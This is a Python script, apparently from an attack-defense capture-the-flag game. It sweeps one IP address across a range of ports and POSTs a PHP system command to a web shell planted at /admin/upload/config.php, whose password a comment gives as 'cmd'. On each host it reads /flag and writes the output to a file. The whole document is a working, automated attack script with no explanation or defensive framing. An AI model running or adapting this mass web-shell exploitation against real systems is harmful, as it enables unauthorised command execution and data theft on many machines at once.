#coding=utf-8
import requests
import re
shell_addr="/admin/upload/config.php"
payload =  {'cmd':'system(\'cat /flag\');'}

iplist = []
for i in range(0,10):
    iplist.append("http://39.100.119.37:50"+str(i)+"80")
print(iplist)
for i in range(10,30):
    iplist.append("http://39.100.119.37:5"+str(i)+"80")
print(iplist)



#密码cmd-路径是config点php
flag_file=open('flag.txt','w')
for ip in iplist:
    url=ip+shell_addr
    #print(url)
    try:
        #flag.write(ip+"\n")
        res=requests.post(url,payload,timeout=2)
        #print(res.text)
        if res.status_code == requests.codes.ok:
            print(url)
            print(res.text)
            flag_file.write(res.text+"\n")
        else:
            pass
    except Exception as e:
        #print(url+" connect shell fail")
        pass
flag_file.close()